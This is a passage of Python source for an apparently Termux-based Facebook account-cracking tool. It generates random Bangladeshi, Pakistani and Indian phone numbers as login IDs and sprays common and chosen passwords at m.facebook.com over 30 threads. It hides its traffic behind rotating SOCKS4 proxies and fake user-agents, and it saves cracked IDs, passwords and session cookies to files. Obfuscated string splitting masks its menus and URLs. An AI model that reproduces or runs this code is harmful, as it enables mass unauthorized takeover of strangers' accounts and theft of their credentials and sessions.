            print(f"\r{P}[{H}%s{P}]. %s%s"%(i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r{P}[{R}!{P}]. {Y}SORRY THERE IS NO EXPIRED APK{P}')
    else:
        print(f'\r%s[ðŸŽ®]. %sYOUR EXPIRED APPLICATIONS  DETAILS:'%(P,Y))
        for i in range(len(game)):
            print(f"\r{P}[{R}%s{P}]. %s%s"%(i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print(f'\r')
            
            

 



#-----------------------[ID CREATION YEAR CHECKER]-----------------------#
def creation(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :younisxyz = '| 2009'
        elif uid[:9] in ['100000000']       :younisxyz = '| 2009'
        elif uid[:8] in ['10000000']        :younisxyz = '| 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:younisxyz = '| 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:younisxyz = '| 2010'
        elif uid[:6] in ['100001']          :younisxyz = '| 2010/2011'
        elif uid[:6] in ['100002','100003'] :younisxyz = '| 2011/2012'
        elif uid[:6] in ['100004']          :younisxyz = '| 2012/2013'
        elif uid[:6] in ['100005','100006'] :younisxyz = '| 2013/2014'
        elif uid[:6] in ['100007','100008'] :younisxyz = '| 2014/2015'
        elif uid[:6] in ['100009']          :younisxyz = '| 2015'
        elif uid[:5] in ['10001']           :younisxyz = '| 2015/2016'
        elif uid[:5] in ['10002']           :younisxyz = '| 2016/2017'
        elif uid[:5] in ['10003']           :younisxyz = '| 2018/2019'
        elif uid[:5] in ['10004']           :younisxyz = '| 2019/2020'
        elif uid[:5] in ['10005']           :younisxyz = '| 2020'
        elif uid[:5] in ['10006','10007','']:younisxyz = '| 2021'
        elif uid[:5] in ['10008']           :younisxyz = '| 2022'
        else:younisxyz=''
    elif len(uid) in [9,10]:
        younisxyz = '| 2008/2009'
    elif len(uid)==8:
        younisxyz = '| 2007/2008'
    elif len(uid)==7:
        younisxyz = '| 2006/2007'
    else:younisxyz=''
    return younisxyz

#---------------------[MAIN MENU]---------------------#
def randommenu():
    global lim
    clear();__durmagi__();verify();iamcheckingyou()
    print(f"{G1}[{R}A{G1}]{X}_{Y}_{Z}>{G1} AUT"+"O PASS"+f"WORD             {G1}[{Y}BE"+f"ST{G1}]")
    print(f"{G2}[{R}B{G2}]{X}_{Y}_{Z}>{G2} CUS"+"TOM PASSW"+f"ORD            {G2}[{Y}NE"+f"W{G2}]")
    print(f"{G3}[{R}C{G3}]{X}_{Y}_{Z}>{G3} M"+"AIN ME"+f"NU                 {G3}[{Y}BA"+f"CK{G3}]")
    _________linex_________()
    ________random________ = input(f"{style}{G4} CHOOSE {RE}●{G4} ")
    if ________random________ in ["", " "]:wash("xdg-open https"+"://www.fa"+"cebook.com/pro"+"file.php?id=10000"+"7169071530");randommenu()
    elif ________random________ in ["A","a","1","One"]:Random()
    elif ________random________ in ["B","b","2","Two"]:___ChoicePass___()
    elif ________random________ in ["C","c","3","Three"]:___R_E_F_A_T___()
    else:print(f'{style} Select Valid Option');time.sleep(2);randommenu()
"""-------------------------(RANDOM MENU)-------------------------"""
def Random():
    global lim
    clear();__durmagi__();verify();iamcheckingyou()
    print(f"{G}[{R}A{G}]{X}_{Y}_{Z}>{G} BANGL"+"ADESH CRAC"+"KING")
    print(f"{G1}[{R}B{G1}]{X}_{Y}_{Z}>{G1} PAKIS"+"TAN CRAC"+"KING")
    print(f"{G2}[{R}C{G2}]{X}_{Y}_{Z}>{G2} IND"+"IA CRA"+"CKING")
    print(f"{G3}[{R}0{G3}]{X}_{Y}_{Z}>{G3} BA"+"CK SYS"+"TEM")
    _________linex_________()
    _________rnd_________ = input(f"{style}{G4} CHO"+f"OSE {RE}●{G4} ")
    if _________rnd_________ in ["", " "]:wash("xdg-open https"+"://www.fa"+"cebook.com/"+"profile.php?id=10000"+"7169071530");___R_E_F_A_T___()
    elif _________rnd_________ in ["A","a","1","One"]:___Bangladesh___()
    elif _________rnd_________ in ["B","b","2","Two"]:___Pakistan___()
    elif _________rnd_________ in ["C","c","3","Three"]:___India___()
    elif _________rnd_________ in ["0","o","O","Exit"]:randommenu()
    else:print(f'{style} SELECT VALID OPTION.......!');time.sleep(2);Random()
"""-------------------------(CUSTOM PASS)-------------------------"""
def ___ChoicePass___():
    global lim
    clear();__durmagi__();verify();iamcheckingyou()
    print(f"{L}[\033[01m\033[94;1m\033[47m ENTER YOUR SIM FIRST FOUR DIGIT CODE\033[40m{L}]")
    _________linex_________()
    print(f"{style} EXA"+f"MPLE BD  {RE}●{G} +880"+"161,+880"+"172,+8801"+"83")
    print(f"{style} EXA"+f"MPLE PK  {RE}●{G} +920"+"30,+92"+"031,+92"+"033")
    print(f"{style} EXAM"+f"PLE IN  {RE}●{G} +91"+"620 +91"+"639 +919"+"50")
    _________linex_________()
    kode = input(f'{style} CHOOSE CODE {RE}●{G} ')
    try:
        clear()
        print(f'{style} EXAMPLE     {RE}●{G} 3000 5000 10000')
        _________linex_________()
        limit = int(input(f'{style} CRACK LIMIT {RE}●{G} '))
    except ValueError:
        limit = 5000
    lim=limit
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    clear()
    try:
        print(f"{style} EXAMPLE     {RE}●{G} 102030,Bangladesh,etc ")
        print(f"{style} EXAMPLE     {RE}●{G} 59039200,57273200,etc ")
        print(f"{style} EXAMPLE     {RE}●{G} khan123,khankhan,.etc")
        _________linex_________()
        passx = int(input(f"{style} PASS LIMIT  {RE}●{G} "))
    except:
        passx = 2
    Hossain = []
    _________linex_________()
    for shahriar in range(passx):
        passw = input(f"{G}[{RE}{shahriar+1}{G}] PASSWORD    {RE}●{G} ")
        _________linex_________()
        Hossain.append(passw)
    clear()
    print(f'{G}[{R}A{G}]{X}_{Y}_{Z}>{G} METHOD {G}[{Y}<{U}({B}1{U}){Y}>{G}] {V}[{Q} Robi \033[38;5;45m+\033[38;5;43m Airtel \033[38;5;41m] ')
    print(f'{G}[{R}B{G}]{X}_{Y}_{Z}>{G} METHOD {G}[{Y}<{U}({B}2{U}){Y}>{G}] {V}[{Q} Gp \033[38;5;45m+\033[38;5;43m Bl \033[38;5;41m] ')
    print(f'{G}[{R}C{G}]{X}_{Y}_{Z}>{G} BACK')
    _________linex_________()
    topfire = input(f"{style} SELECT METHOD : ")
    with refatshahriar(max_workers=30) as Refat:
        clear()
        tl = str(len(user))
        print(f"{style} TOTAL ID    {RE}●{G} {tl}")
        print(f"{style} SELECT CODE {RE}●{G} {kode}")
        print(f"{style} IF ID NOTE COME {W}[{R}ON{W}/{G}OFF{W}]{G} AIRPLANE ")
        _________linex_________()
        for psx in user:
            passlist = [psx[1:]]
            ___Main_Uid___ = kode+psx
            for Fahad in Hossain:
                passlist.append(Fahad)
                if topfire in ["A","a","1","One"]:Refat.submit(___TopRndm1___,___Main_Uid___,passlist,tl)
                elif topfire in ["B","b","2","Two"]:Refat.submit(___TopRndm2___,___Main_Uid___,passlist,tl)
                elif topfire in ["C","c","3","Three"]:Random()
                else:Refat.submit(___TopRndm2___,___Main_Uid___,passlist,tl)
    print("")
    _________linex_________()
    print(f'{style} RANDOM CRACKING HAS BEEN COMPLETE....!')
    print(f'{style}{G} YOUR TOTAL [OK-IDS] {RE}●{G} [{str(len(oks))}]')
    _________linex_________()
    input(f"{style} PRESS ENTER TO BACK ORIGINAL MENU....!");___R_E_F_A_T___()
"""-------------------------(BD CRACKING)-------------------------"""
def ___Bangladesh___():
    global lim
    clear();__durmagi__();verify();iamcheckingyou()
    print(f'{style} EXAMPLE     {RE}●{G} 016 017 018 019')
    _________linex_________()
    kode = input(f'{style} CHOOSE CODE {RE}●{G} ')
    try:
        clear()
        print(f'{style} EXAMPLE     {RE}●{G} 3000 , 5000 , 10000')
        _________linex_________()
        limit = int(input(f'{style} CRACK LIMIT {RE}●{G} '))
    except ValueError:
        limit = 5000
    lim=limit
    for nmbr in range(limit):
        koda = ''.join(random.choice(string.digits) for _ in range(2))
        kodb = ''.join(random.choice(string.digits) for _ in range(2))
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    clear()
    print(f'{G}[{R}A{G}]{X}_{Y}_{Z}>{G} METHOD {G}[{Y}<{U}({B}1{U}){Y}>{G}] {V}[{Q} Robi \033[38;5;45m+\033[38;5;43m Airtel \033[38;5;41m] ')
    print(f'{G}[{R}B{G}]{X}_{Y}_{Z}>{G} METHOD {G}[{Y}<{U}({B}2{U}){Y}>{G}] {V}[{Q} Gp \033[38;5;45m+\033[38;5;43m Bl \033[38;5;41m] ')
    print(f'{G}[{R}C{G}]{X}_{Y}_{Z}>{G} BACK')
    _________linex_________()
    topfire = input(f"{style} SELECT METHOD : ")
    with refatshahriar(max_workers=30) as Refat:
        clear()
        tl = str(len(user))
        print(f"{style} TOTAL ID    {RE}●{G} {tl}")
        print(f"{style} SELECT CODE {RE}●{G} {kode}")
        print(f"{style} IF ID NOTE COME {W}[{R}ON{W}/{G}OFF{W}]{G} AIRPLANE ")
        _________linex_________()
        for psx in user:
            ___Main_Uid___ = kode+koda+kodb+psx
            passlist = [koda+kodb+psx,kodb+psx,kode+koda+kodb,kode+kode,'১২৩৪৫৬']
            if topfire in ["A","a","1","One"]:Refat.submit(___TopRndm1___,___Main_Uid___,passlist,tl)
            elif topfire in ["B","b","2","Two"]:Refat.submit(___TopRndm2___,___Main_Uid___,passlist,tl)
            elif topfire in ["C","c","3","Three"]:Random()
            else:Refat.submit(___TopRndm2___,___Main_Uid___,passlist,tl)
    print("")
    _________linex_________()
    print(f'{style} RANDOM CRACKING HAS BEEN COMPLETE....!')
    print(f'{style}{G} YOUR TOTAL [OK-IDS] {RE}●{G} [{str(len(oks))}]')
    _________linex_________()
    input(f"{style} PRESS ENTER TO BACK ORIGINAL MENU....!");___R_E_F_A_T___()
"""-------------------------(PAK CRACKING)-------------------------"""
def ___Pakistan___():
    global lim
    clear();__durmagi__();verify();iamcheckingyou()
    print(f'{style} EXAMPLE     {RE}●{G} 0306 0315 0335 0345')
    _________linex_________()
    kode = input(f'{style} CHOOSE CODE {RE}●{G} ')
    try:
        clear()
        print(f'{style} EXAMPLE     {RE}●{G} 3000 5000 10000')
        _________linex_________()
        limit = int(input(f'{style} CRACK LIMIT {RE}●{G} '))
    except ValueError:
        limit = 5000
    lim=limit
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    clear()
    print(f'{G}[{R}A{G}]{X}_{Y}_{Z}>{G} METHOD {G}[{Y}<{U}({B}1{U}){Y}>{G}] {V}[{Q} Robi \033[38;5;45m+\033[38;5;43m Airtel \033[38;5;41m] ')
    print(f'{G}[{R}B{G}]{X}_{Y}_{Z}>{G} METHOD {G}[{Y}<{U}({B}2{U}){Y}>{G}] {V}[{Q} Gp \033[38;5;45m+\033[38;5;43m Bl \033[38;5;41m] ')
    print(f'{G}[{R}C{G}]{X}_{Y}_{Z}>{G} BACK')
    _________linex_________()
    topfire = input(f"{style} SELECT METHOD : ")
    with refatshahriar(max_workers=30) as Refat:
        clear()
        tl = str(len(user))
        print(f"{style} TOTAL ID    {RE}●{G} {tl}")
        print(f"{style} SELECT CODE {RE}●{G} {kode}")
        print(f"{style} IF ID NOTE COME {W}[{R}ON{W}/{G}OFF{W}]{G} AIRPLANE ")
        _________linex_________()
        for psx in user:
            ___Main_Uid___ = kode+psx
            passlist = [psx,___Main_Uid___,'khankhan','khan1122','khan12345','khan123','khanbaba','pakistan','khanzada','malik123','kingkhan','alikhan','janjan','pak123','pubg123']
            if topfire in ["A","a","1","One"]:Refat.submit(___TopRndm1___,___Main_Uid___,passlist,tl)
            elif topfire in ["B","b","2","Two"]:Refat.submit(___TopRndm2___,___Main_Uid___,passlist,tl)
            elif topfire in ["C","c","3","Three"]:Random()
            else:Refat.submit(___TopRndm2___,___Main_Uid___,passlist,tl)
    print("")
    _________linex_________()
    print(f'{style} RANDOM CRACKING HAS BEEN COMPLETE....!')
    print(f'{style}{G} YOUR TOTAL [OK-IDS] {RE}●{G} [{str(len(oks))}]')
    _________linex_________()
    input(f"{style} PRESS ENTER TO BACK MAIN MENU....!");___R_E_F_A_T___()
			

def YounisXyz(uid,pwx,tl):
    global loop,cps,oks,lim
    try:
        for ___Main_Pass___ in passlist:
            session = requests.Session()
            p=round(loop*100/lim,2)
            xoxo = random.choice(colors)
            sys.stdout.write(f"\r{W}[{G}TOP{W}-{G}R1{W}]{G}<{WH}━━{G}>{W}[{xoxo}{loop}{W}]{G}<{WH}━━{G}>{W}[{G}OK{W}-{G}{len(oks)}{W}]{G}<{WH}━━{G}>{W}[{xoxo}{p}{W}]");sys.stdout.flush()
            rr = random.randint;rc = random.choice
            proxs = requests.get('http'+'s:/'+'/ra'+'w.git'+'hubus'+'ercon'+'tent.com'+'/The'+'Spe'+'edX/'+'SOC'+'KS-'+'List'+'/ma'+'ste'+'r/soc'+'ks4.'+'txt').text
            open('.s'+'ock'+'s'+'ku'+'.tx'+'t','w').write(proxs)
            nip = rc(proxs)
            proxs = {'http': 'so'+'ck'+'s4'+'://'+nip}
            uau = "Mozilla/5.0 (Linux; Android "+str(random.randint(4,13))+"; "+str(random.choice(mdl))+" Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
            top_login = session.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=521182029780294&kid_directed_site=0&app_id=521182029780294&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D521182029780294%26scope%3Dopenid%2Bemail%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fid.condenast.com%252Finteraction%252Fopenid%252Ffacebook%252Fcomplete%26state%3DS36YbWjHL4HD73w9YA8Jm%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D29764e2e-8dec-4b28-898f-fd3c6fb68dde%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fid.condenast.com%2Finteraction%2Fopenid%2Ffacebook%2Fcomplete%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DS36YbWjHL4HD73w9YA8Jm%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr").text
            ___top_data___ = {'m_ts': re.search('name="m_ts" value="(.*?)"', str(top_login)).group(1),
            'li': re.search('name="li" value="(.*?)"', str(top_login)).group(1),
            'try_number': '0',
            'unrecognized_tries': '0',
            'email': ___Main_Uid___,
            'prefill_contact_point': '',
            'prefill_source': '',
            'prefill_type': '',
            'first_prefill_source': '',
            'first_prefill_type': '',
            'had_cp_prefilled': 'false',
            'had_password_prefilled': 'false',
            'is_smart_lock': 'true',
            'bi_xrwh': '0',
            'pass': ___Main_Pass___,
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(top_login)).group(1),
            'lsd': re.search('name="lsd" value="(.*?)"', str(top_login)).group(1),
            '__dyn': '',
            '__csr': '',
            '__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),
            '__a': '',
            '__user': '0',
            '_fb_noscript': 'true'}
            ___top_head___ = {'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': uau,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=521182029780294&kid_directed_site=0&app_id=521182029780294&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D521182029780294%26scope%3Dopenid%2Bemail%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fid.condenast.com%252Finteraction%252Fopenid%252Ffacebook%252Fcomplete%26state%3DS36YbWjHL4HD73w9YA8Jm%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D29764e2e-8dec-4b28-898f-fd3c6fb68dde%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fid.condenast.com%2Finteraction%2Fopenid%2Ffacebook%2Fcomplete%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DS36YbWjHL4HD73w9YA8Jm%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
            url = "https://m.facebook.com/login.php?skip_api_login=1&api_key=521182029780294&kid_directed_site=0&app_id=521182029780294&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D521182029780294%26scope%3Dopenid%2Bemail%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fid.condenast.com%252Finteraction%252Fopenid%252Ffacebook%252Fcomplete%26state%3DS36YbWjHL4HD73w9YA8Jm%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D29764e2e-8dec-4b28-898f-fd3c6fb68dde%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fid.condenast.com%2Finteraction%2Fopenid%2Ffacebook%2Fcomplete%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DS36YbWjHL4HD73w9YA8Jm%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr"
            lo = session.post(url,data=___top_data___,headers=___top_head___,allow_redirects=False,proxies=proxs).text
            ___Top_Cookies___ = session.cookies.get_dict().keys()
            if 'c_user' in ___Top_Cookies___:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = re.findall('c_user=(.*);xs', coki)[0]
                response = str(requests.get(f'https://graph.facebook.com/{uid}/picture?type=normal').text)
                if 'Photoshop' in response:
                    print(f'\r\r{W}[{G}TOP{W}-{G}OK{W}]{G} {uid} {W}|{G} {___Main_Pass___}     ');open('/sdcard/TOP/TOP-RNDM-M2-OK.txt','a').write(uid+'|'+___Main_Pass___+'\n');open('/sdcard/TOP/TOP-RNDM-COOKIES-M2.txt','a').write(uid+'|'+___Main_Pass___+'|'+coki+'\n')
                    print(f'\r\r\033[38;5;93m[{G}COOKIE\033[38;5;93m]{G} {coki}\n')
                    oks.append(uid)
                else:break
            elif 'checkpoint' in ___Top_Cookies___:
                print(f'\r\r{W}[{R}TOP{W}-{R}CP{W}]{R} {___Main_Uid___} {W}|{R} {___Main_Pass___}       ')
                cps.append(___Main_Uid___)
                break
            else:continue
        loop+=1
        x = random.choice(colors)
        emoji_motion = random.choice(["ðŸ˜‡","ðŸ˜Œ","ðŸ˜","ðŸ˜˜","ðŸ¤‘","ðŸ˜","ðŸ˜›","ðŸ˜¶","ðŸ˜œ","ðŸ˜","ðŸ˜†","ðŸ˜„","ðŸ˜…","ðŸ¤—","ðŸ˜¡","ðŸ˜¤","ðŸ˜©","ðŸ˜¢","ðŸ˜²"])
        #sys.stdout.write(f"\r\033[0;97m[{x}YounisXyzðŸ”¥\033[0;97m] [\033[1;92m{tl}\033[0;97m/\033[1;93m{loop}\033[0;97m] [\033[1;92mOK:{len(ok)}\033[0;97m] [\033[1;93mCP:{len(cp)}\033[0;97m] [\033[1;96m{XYZTIME()}\033[0;97m] [\x1b[38;5;208m{'{:.1%}'.format(loop/float(tl))}\033[0;97m] ")
        sys.stdout.write(f"\r\033[0;97m[{x}{uid}\033[0;97m] [\033[1;96m{tl}\033[1;97m/\033[1;93m{loop}\033[0;97m] [\033[1;92mOK:{len(ok)}\033[1;97m] [\033[1;91mCP:{len(cp)}\033[0;97m] [\033[1;93m{'{:.0%}'.format(loop/float(tl))}\033[0;97m]")
        sys.stdout.flush()
    except:
        pass
Main








